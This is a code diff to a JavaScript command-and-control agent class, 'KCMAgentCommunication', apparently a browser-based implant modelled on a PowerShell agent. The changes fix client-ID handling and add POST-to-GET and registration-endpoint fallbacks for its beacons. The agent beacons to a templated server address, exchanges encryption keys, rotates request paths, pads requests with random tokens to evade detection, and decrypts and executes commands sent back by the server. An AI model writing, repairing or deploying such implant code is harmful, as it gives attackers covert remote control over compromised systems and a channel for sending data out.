@@ -398,6 +398,9 @@ class HTMLAgentPlugin(BaseAgentPlugin):
 
 class KCMAgentCommunication {
     constructor(config) {
+        // Create a persistent client ID that doesn't change between beacons
+        this.persistentClientId = 'client_' + Math.random().toString(36).substring(2, 10);
+        
         // Configuration
         this.config = {
             serverAddress: config.serverAddress || '{{SERVER_ADDRESS}}',
@@ -412,7 +415,7 @@ class KCMAgentCommunication {
         
         // Communication state
         this.state = {
-            clientId: this.generateClientId(),
+            clientId: null, // Start with null, will be populated by server
             firstContact: true,
             serverPublicKey: null,
             encryptionKey: null,
@@ -498,7 +501,15 @@ class KCMAgentCommunication {
             // If this is first contact, use special beacon
             if (this.state.firstContact) {
                 this.updateUIStatus("Establishing first contact...");
-                await this.sendFirstContactBeacon(systemInfo);
+                const firstContactSuccess = await this.sendFirstContactBeacon();
+                
+                // Only set firstContact to false if we've registered a key successfully
+                if (this.state.keyRegistered) {
+                    this.state.firstContact = false;
+                    console.log("First contact successful, switching to regular beacons");
+                } else {
+                    console.log("Key not yet registered, will retry first contact");
+                }
             } else {
                 // Regular beacon for established connection
                 this.updateUIStatus("Sending regular beacon...");
@@ -553,11 +564,11 @@ class KCMAgentCommunication {
         // Convert to JSON
         const operationJson = JSON.stringify(operationPayload);
         
-        // Create the beacon exactly like PowerShell's format
+        // Create the beacon with our persistent ID
         const initialBeacon = {
             d: operationJson,
             t: this.generateRandomToken(50),
-            c: null // PowerShell uses null for client_id on first contact
+            c: this.persistentClientId // Use our persistent ID for first contact
         };
         
         // Use a random path from the pool
@@ -565,17 +576,36 @@ class KCMAgentCommunication {
         const fullUrl = `${this.config.protocol}://${this.config.serverAddress}${beaconPath}`;
         
         try {
-            // Make POST request
-            const response = await fetch(fullUrl, {
-                method: 'POST',
-                mode: 'cors',
-                credentials: 'omit', 
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': this.config.userAgent
-                },
-                body: JSON.stringify(initialBeacon)
-            });
+            // Try POST request first
+            let response;
+            try {
+                response = await fetch(fullUrl, {
+                    method: 'POST',
+                    mode: 'cors',
+                    credentials: 'omit', 
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': this.config.userAgent
+                    },
+                    body: JSON.stringify(initialBeacon)
+                });
+            } catch (error) {
+                // If POST fails with 401, try GET instead (following PowerShell pattern)
+                console.log('POST request failed, trying GET fallback');
+                
+                // Format query string like PowerShell does
+                const queryString = `?d=${encodeURIComponent(initialBeacon.d)}&t=${encodeURIComponent(initialBeacon.t)}&i=true&c=${encodeURIComponent(this.persistentClientId)}`;
+                
+                // Make GET request
+                response = await fetch(`${fullUrl}${queryString}`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'User-Agent': this.config.userAgent
+                    }
+                });
+            }
             
             if (!response.ok) {
                 throw new Error(`HTTP error: ${response.status}`);
@@ -584,18 +614,19 @@ class KCMAgentCommunication {
             // Process the response
             const responseData = await response.json();
             
+            // Capture server's assigned client ID
+            if (responseData.c) {
+                this.state.clientId = responseData.c;
+                console.log(`Server assigned client ID: ${this.state.clientId}`);
+            }
+            
             // Check for server's public key
             if (responseData.pubkey) {
                 // Process the server's public key - this will register our key
                 await this.processServerPublicKey(responseData.pubkey);
             } else {
                 console.error('No public key found in server response!');
-            }
-            
-            // Update client ID if provided
-            if (responseData.c) {
-                this.state.clientId = responseData.c;
-                console.log(`Server assigned client ID: ${this.state.clientId}`);
+                return false;
             }
             
             // Update path rotation info if provided
@@ -630,11 +661,13 @@ class KCMAgentCommunication {
                     }
                 }
             }
+            
+            return true;
         }
         catch (error) {
             console.error("First contact beacon failed:", error);
             this.updateUIStatus("Connection failed: " + error.message);
-            throw error;
+            return false;
         }
     }
     
@@ -660,69 +693,90 @@ class KCMAgentCommunication {
         // Create the request payload
         const requestPayload = {
             d: encryptedData,
-            t: this.generateRandomToken(50 + Math.floor(Math.random() * 450))
+            t: this.generateRandomToken(50 + Math.floor(Math.random() * 450)),
+            c: this.state.clientId || this.persistentClientId // Include client ID in all beacons
         };
         
-        // Convert to JSON
-        const requestJson = JSON.stringify(requestPayload);
-        
-        // Send the request
-        const response = await fetch(fullUrl, {
-            method: 'POST',
-            mode: 'cors', // Explicitly request CORS handling
-            credentials: 'omit', // Don't send cookies
-            headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': this.config.userAgent,
-                'Origin': window.location.origin || 'null' // Add origin header
-            },
-            body: JSON.stringify(initialBeacon)
-        });
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error: ${response.status}`);
-        }
-        
-        // Process the response
-        const responseData = await response.json();
-        
-        // Reset consecutive failures on successful response
-        this.state.consecutiveFailures = 0;
-        
-        // Check for path rotation info
-        if (responseData.r) {
-            const rotationInfo = responseData.r;
-            if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {
-                this.state.currentRotationId = rotationInfo.cid;
-                this.state.nextRotationTime = rotationInfo.nrt;
-                console.log(`Updated rotation info - ID: ${rotationInfo.cid}, Next rotation: ${new Date(rotationInfo.nrt * 1000).toLocaleString()}`);
+        try {
+            // Try POST first
+            let response;
+            try {
+                response = await fetch(fullUrl, {
+                    method: 'POST',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': this.config.userAgent,
+                        'Origin': window.location.origin || 'null'
+                    },
+                    body: JSON.stringify(requestPayload)
+                });
+            } catch (error) {
+                // If POST fails, try GET as fallback
+                console.log('POST beacon failed, trying GET fallback: ', error);
+                
+                // Format query string with client ID
+                const queryString = `?d=${encodeURIComponent(requestPayload.d)}&t=${encodeURIComponent(requestPayload.t)}&c=${encodeURIComponent(requestPayload.c)}`;
+                
+                response = await fetch(`${fullUrl}${queryString}`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'User-Agent': this.config.userAgent
+                    }
+                });
             }
-        }
-        
-        // Process commands if available
-        if (responseData.com) {
-            let commands = responseData.com;
             
-            // Check if commands are encrypted
-            if (responseData.e && this.state.encryptionKey) {
-                // Decrypt the commands
-                const decryptedCommands = await this.crypto.decrypt(commands, this.state.encryptionKey);
-                try {
-                    commands = JSON.parse(decryptedCommands);
-                } catch (e) {
-                    console.error('Error parsing decrypted commands:', e);
+            if (!response.ok) {
+                throw new Error(`HTTP error: ${response.status}`);
+            }
+            
+            // Process the response
+            const responseData = await response.json();
+            
+            // Reset consecutive failures on successful response
+            this.state.consecutiveFailures = 0;
+            
+            // Check for path rotation info
+            if (responseData.r) {
+                const rotationInfo = responseData.r;
+                if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {
+                    this.state.currentRotationId = rotationInfo.cid;
+                    this.state.nextRotationTime = rotationInfo.nrt;
+                    console.log(`Updated rotation info - ID: ${rotationInfo.cid}, Next rotation: ${new Date(rotationInfo.nrt * 1000).toLocaleString()}`);
                 }
             }
             
-            // Process each command
-            if (Array.isArray(commands)) {
-                for (const command of commands) {
-                    await this.processCommand(command);
+            // Process commands if available
+            if (responseData.com) {
+                let commands = responseData.com;
+                
+                // Check if commands are encrypted
+                if (responseData.e && this.state.encryptionKey) {
+                    // Decrypt the commands
+                    const decryptedCommands = await this.crypto.decrypt(commands, this.state.encryptionKey);
+                    try {
+                        commands = JSON.parse(decryptedCommands);
+                    } catch (e) {
+                        console.error('Error parsing decrypted commands:', e);
+                    }
+                }
+                
+                // Process each command
+                if (Array.isArray(commands)) {
+                    for (const command of commands) {
+                        await this.processCommand(command);
+                    }
                 }
             }
+            
+            return true;
+        } catch (error) {
+            console.error('Error in beacon:', error);
+            throw error;
         }
-        
-        return true;
     }
     
     // Process server's public key and initiate key exchange
@@ -763,12 +817,15 @@ class KCMAgentCommunication {
             
             console.log('Encrypted client key with server\'s public key');
             
+            // Use the effective client ID (server-assigned or persistent)
+            const effectiveClientId = this.state.clientId || this.persistentClientId;
+            
             // Register the key with the server
-            const registrationResult = await this.registerClientKey(encryptedKey, this.state.clientId);
+            const registrationResult = await this.registerClientKey(encryptedKey, effectiveClientId);
             
             if (registrationResult) {
                 this.state.keyRegistered = true;
-                this.state.firstContact = false;
+                // Note: We no longer set firstContact to false here, that's handled in startAgentLoop
                 console.log('Successfully registered client key with server');
                 this.updateUIStatus("Secure communication established");
                 return true;
@@ -787,10 +844,13 @@ class KCMAgentCommunication {
     // Register client key with the server
     async registerClientKey(encryptedKey, clientId) {
         try {
+            // Use the server-assigned ID if available, otherwise use our persistent ID
+            const effectiveClientId = this.state.clientId || this.persistentClientId;
+            
             // Create registration request - MATCH THE FORMAT EXPECTED BY THE SERVER
             const registrationData = {
                 encrypted_key: encryptedKey,
-                client_id: clientId,
+                client_id: effectiveClientId,
                 nonce: this.generateRandomToken(16)  // Random nonce for replay protection
             };
             
@@ -800,21 +860,41 @@ class KCMAgentCommunication {
             // THIS IS CRITICAL - Use the dedicated registration endpoint
             const registrationUrl = `${this.config.protocol}://${this.config.serverAddress}/client/service/registration`;
             
-            console.log(`Sending key registration to ${registrationUrl}`);
+            console.log(`Sending key registration to ${registrationUrl} with client ID: ${effectiveClientId}`);
             this.updateUIStatus("Registering secure key...");
             
             // Send the registration request
-            const response = await fetch(fullUrl, {
-                method: 'POST',
-                mode: 'cors', // Explicitly request CORS handling
-                credentials: 'omit', // Don't send cookies
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': this.config.userAgent,
-                    'Origin': window.location.origin || 'null' // Add origin header
-                },
-                body: JSON.stringify(initialBeacon)
-            });
+            let response;
+            try {
+                response = await fetch(registrationUrl, {
+                    method: 'POST',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': this.config.userAgent,
+                        'Origin': window.location.origin || 'null'
+                    },
+                    body: registrationJson
+                });
+            } catch (error) {
+                // If the dedicated endpoint fails, try with a random path as fallback
+                console.log('Registration endpoint failed, trying with random path: ', error);
+                const fallbackPath = this.getRandomPath();
+                const fallbackUrl = `${this.config.protocol}://${this.config.serverAddress}${fallbackPath}`;
+                
+                response = await fetch(fallbackUrl, {
+                    method: 'POST',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': this.config.userAgent,
+                        'Origin': window.location.origin || 'null'
+                    },
+                    body: registrationJson
+                });
+            }
             
             if (!response.ok) {
                 throw new Error(`HTTP error: ${response.status}`);
@@ -828,7 +908,7 @@ class KCMAgentCommunication {
             return false;
         }
     }
-    
+        
     // Send command result back to the server
     async sendCommandResult(timestamp, result) {
         // Select a random path for sending results
